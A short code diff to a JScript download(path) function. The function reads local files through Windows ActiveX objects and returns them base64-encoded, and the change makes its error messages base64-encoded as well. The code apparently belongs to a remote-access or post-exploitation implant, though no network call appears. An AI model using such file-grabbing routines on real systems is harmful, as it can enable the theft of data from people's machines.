@@ -2,7 +2,7 @@ function download(path) {
     try{
         fs = new ActiveXObject("Scripting.FileSystemObject")
         if (fs.FileExists(path) == false){
-            return path + ' does not exist.';
+           return b64e(path + ' does not exist.');
         }
         var stream = new ActiveXObject("ADODB.Stream");
         stream.Open();
@@ -13,6 +13,6 @@ function download(path) {
         stream.Close();
         return b64e(data);
     } catch (e) {
-        return e.message;
+        return b64e(e.message);
     }
 }
